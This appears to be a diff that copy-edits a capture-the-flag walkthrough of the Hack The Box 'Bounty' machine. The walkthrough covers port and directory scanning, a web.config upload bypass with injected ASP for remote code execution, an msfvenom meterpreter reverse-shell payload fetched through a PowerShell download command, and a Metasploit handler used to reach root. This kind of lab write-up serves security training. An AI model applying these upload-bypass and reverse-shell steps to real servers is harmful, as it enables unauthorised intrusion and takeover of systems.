@@ -17,7 +17,7 @@
 
 == Scanning Phase
 
-First of all we check the IP of the
+First, we check the IP of the
 https://www.hackthebox.eu/home/machines/profile/142[Bounty]
 machine and try a +ping+
 to see if we have access.
@@ -32,27 +32,27 @@ host$ ping -c2 10.10.10.93
 
 image::ping.png[ping]
 
-Then scan the ports with +nmap+,
-in this case we're going to use basic +nmap+.
+Then, we scan the ports with +nmap+.
+In this case, we’re going to use basic +nmap+.
 
 [source, bash]
 ----
 host$ nmap 10.10.10.93
 ----
 
-And we see that there is only one port open +port 80+.
+And, we see that there is only one port open +port 80+.
 
 image::nmap.png[nmap]
 
-Then we try to access to the +port 80+ with our browser
+Then, we try to access +port 80+ with our browser,
 and it opens a web page with an image of Merlin.
 
 image::web.png[web-page]
 
-As we see in this page
-there is nothing in there more than an image,
-so we're going to scan the whole web server with +dirbuster+
-to check if we can access something useful.
+As we see on this page,
+there is nothing more than an image,
+so we’re going to scan the whole web server with +dirbuster+
+to see if we can access something useful.
 
 [source, bash]
 ----
@@ -62,13 +62,11 @@ host$ dirb http://10.10.10.91
 
 image::dirb.png[dirb-scan]
 
-Here we found a folder
-where uploaded files are stored,
-we need the page of the upload functionality,
-with +dirbuster+ and some options
-we can set different extensions
-and obtain what we are looking for.
-Since is a +Windows+ machine,
+Here we found a folder where uploaded files are stored.
+We need the page of the upload functionality.
+With +dirbuster+, and some options,
+we can set different extensions and obtain what we are looking for.
+Since this is a +Windows+ machine,
 we are going to use +asp+ and +aspx+ extensions.
 
 [source, bash]
@@ -93,16 +91,14 @@ it returns an error.
 
 image::upload2.png[upload2]
 
-The web server has a filter,
-that possibly checks the extension
-of the file uploaded,
-if you try with double extension
-it won't work either.
+The web server has a filter
+that possibly checks the extension of the uploaded file.
+If you try with double extension it won’t work either.
 
-So what we can do?
-In +Windows+ there is 3 major types of extensions:
-+asp+, +aspx+ and +config+.
-We already tried with an +asp+/+aspx+ extension,
+So what can we do?
+In +Windows+ there are +3+ major types of extensions:
++asp+, +aspx+, and +config+.
+We already tried the +asp+ and +aspx+ extensions,
 what happens if we upload a +web.config+ file?
 
 [source, xml,linenums]
@@ -133,24 +129,19 @@ what happens if we upload a +web.config+ file?
 
 image::upload1.png[upload11]
 
-We can see that result is positive.
-The +web.config+ file is used
-by +IIS+ servers
-to store settings
-that comes with the installation of the API.
+We can see the result is positive.
+The +web.config+ file is used by +IIS+ servers
+to store settings that come with the installation of the +API+.
 
-
-With this we can start to
-exploit this machine.
-There is a vulnerability
-on the +web.config+ file processing,
-that could allow an attacker to execute code remotely
+With this, we can start to exploit this machine.
+There is a vulnerability on the +web.config+ file processing
+that could allow an attacker to execute code remotely,
 by injecting +asp+ code in the file
 (More information can be found
 link:https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/[here]
 ).
 
-So in order to have remote code execution (+RCE+)
+So, in order to have remote code execution (+RCE+),
 we need to add the following lines
 to our +web.config+ file:
 
@@ -169,53 +160,46 @@ Response.write("</pre><p><!-"&"-")
 -->
 ----
 
-Then we upload it
-and access the file via the web as before.
+Then, we upload it,
+and access the file via the web, as before.
 
 image::rce-ok.png[rce-ok]
 
-*Eureka!* With this we can have our user flag,
+*Eureka!* With this, we can have our user flag,
 but we want an active shell
 that we can use for further enumeration.
-For this we can use +msfvenom+,
-this is a tool
-that creates payloads
-in order to gain access to a machine,
-it installed by default on +Kali+,
+For this, we can use +msfvenom+.
+This is a tool that creates payloads
+in order to gain access to a machine.
+It is installed by default on +Kali+;
 it also comes with the installation of +Metasploit+.
-Then upload our file to the server
-with our +RCE+
+Then, we upload our file to the server with our +RCE+
 and start a web server on our side
 to download our exploit.
 
-First of all,
-the exploit with +msfvenom+:
+First, the exploit with msfvenom:
 
 [source, bash]
 ----
 host$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip.ip.ip.ip LPORT=port -f exe -o myexploit.exe --smallest
 ----
 
-This will create a malicious file,
-when we executed on the server
-will give us a reverse shell
-with our +RCE+ file
-using +meterpreter+,
-this is an advanced, dynamically extensible payload
-that uses in-memory +DLL+ injection stagers
+This will create a malicious file.
+When executed on the server
+it will give us a reverse shell with our +RCE+ file using +meterpreter+.
+This is an advanced, dynamically extensible payload
+that uses in-memory +DLL+ injection stagers,
 and is extended over the network at runtime.
 
-Then we need to start a web server
-in our machine,
-we can do it with +Python+ by running:
+Then we need to start a web server in our machine.
+We can do it with +Python+ by running:
 
 [source, bash]
 ----
 host$ python -m SimpleHTTPServer 7000
 ----
 
-To make the server
-to download our file
+To make the server download our file,
 we can use the next +PowerShell+ command
 in our +web.config+ file
 replacing the +whoami+ one:
@@ -226,8 +210,7 @@ Set cmd1 = wShell1.Exec("cmd.exe /c powershell -NoProfile -ExecutionPolicy unres
 ----
 
 Upload it, and then open it on a private tab.
-We can see now
-that the server downloaded our file.
+Now, we can see that the server downloaded our file.
 
 image::download.png[download]
 
@@ -244,9 +227,8 @@ msf exploit(multi/handler) > set LPORT port
 msf exploit(multi/handler) > run
 ----
 
-With this we are ready
-to initiate our reverse shell.
-In order to do this
+With this, we are ready to initiate our reverse shell.
+In order to do it,
 we need to run our exploit on the server
 with the same +RCE+ method as before,
 changing the command to the following:
@@ -268,18 +250,17 @@ we can start to enumerate the server.
 
 image::sys-info.png[sys-info]
 
-And we see
-that the server has an +x64 Architecture+,
-we are going to repeat the process
-(+msfvenom+, upload, handler, run)
+And, we see that the server has an +x64 Architecture+.
+We are going to repeat the process
+(+msfvenom+, +upload+, +handler+, +run+)
 but now with the payload:
 
 ----
 windows/x64/meterpreter/reverse_tcp
 ----
 
-Then when we have another session opened,
-we are going to run the next:
+Then, when we have another session opened,
+we are going to run the next one:
 
 [source,bash]
 ----
@@ -311,7 +292,8 @@ image::admin.png[admin]
 
 With this we can read our +root+ flag.
 
-We learned on this challenge
-a vulnerability with the +web.config+ file,
-to always check the +architecture+ when we access as an user on a machine
-and to use some of the +meterpreter+ commands.
+On this challenge, we learned there was a vulnerability
+with the +web.config+ file.
+We also learned to always check the architecture
+when we access a machine as a user,
+and how to use some of the +meterpreter+ commands.
